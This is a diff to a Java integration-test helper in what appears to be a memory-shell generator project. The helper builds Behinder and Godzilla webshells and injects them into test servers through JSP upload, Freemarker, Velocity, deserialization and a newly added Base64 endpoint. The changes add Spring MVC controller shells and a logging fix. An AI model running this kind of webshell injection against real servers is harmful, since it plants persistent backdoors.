@@ -1,6 +1,7 @@
 package com.reajason.javaweb.integration;
 
 import com.reajason.javaweb.GeneratorMain;
+import com.reajason.javaweb.memshell.SpringMVCShell;
 import com.reajason.javaweb.memshell.config.*;
 import com.reajason.javaweb.memshell.packer.Packer;
 import lombok.extern.slf4j.Slf4j;
@@ -15,7 +16,7 @@ public class ShellAssertionTool {
         String shellUrl = url + "/test";
 
         InjectorConfig injectorConfig = new InjectorConfig();
-        if (shellType.endsWith(Constants.SERVLET)) {
+        if (shellType.endsWith(Constants.SERVLET) || shellType.endsWith(SpringMVCShell.CONTROLLER_HANDLER)) {
             String urlPattern = "/" + shellTool + shellType + packer.name();
             shellUrl = url + urlPattern;
             injectorConfig.setUrlPattern(urlPattern);
@@ -56,7 +57,7 @@ public class ShellAssertionTool {
                 String behinderPass = "pass";
                 String behinderHeaderValue = "Behinder" + shellType + packer.name();
                 BehinderConfig behinderConfig = BehinderConfig.builder().pass(behinderPass).headerName("User-Agent").headerValue(behinderHeaderValue).build();
-                log.info("generated {} godzilla with pass: {}, headerValue: {}", shellType, behinderPass, behinderHeaderValue);
+                log.info("generated {} behinder with pass: {}, headerValue: {}", shellType, behinderPass, behinderHeaderValue);
                 String behinderContent = GeneratorMain.generate(shellConfig, injectorConfig, behinderConfig, packer);
                 assertInjectIsOk(url, shellType, shellTool, behinderContent, packer);
                 BehinderShellTool.testIsOk(shellUrl, behinderConfig);
@@ -64,6 +65,7 @@ public class ShellAssertionTool {
     }
 
     public static void assertInjectIsOk(String url, String shellType, ShellTool shellTool, String content, Packer.INSTANCE packer) {
+        System.out.println(content);
         switch (packer) {
             case JSP -> {
                 String uploadEntry = url + "/upload";
@@ -79,6 +81,7 @@ public class ShellAssertionTool {
             case Freemarker -> VulTool.postData(url + "/freemarker", content);
             case Velocity -> VulTool.postData(url + "/velocity", content);
             case Deserialize -> VulTool.postData(url + "/java_deserialize", content);
+            case Base64 -> VulTool.postData(url + "/b64", content);
         }
     }
 }
